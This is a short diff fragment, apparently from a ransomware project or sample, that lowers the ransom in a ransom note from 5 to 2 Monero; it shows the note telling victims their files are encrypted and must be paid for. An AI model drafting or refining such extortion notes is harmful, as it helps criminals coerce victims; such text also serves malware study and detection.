@@ -33,7 +33,7 @@ Your important files are encrypted, which means you cannot access them anymore u
 
 
 How Can I Recover My Files?
-To recover your files, you need to send 5 Monero (XMR) to the following address:
+To recover your files, you need to send 2 Monero (XMR) to the following address:
 
 
 Monero Address:
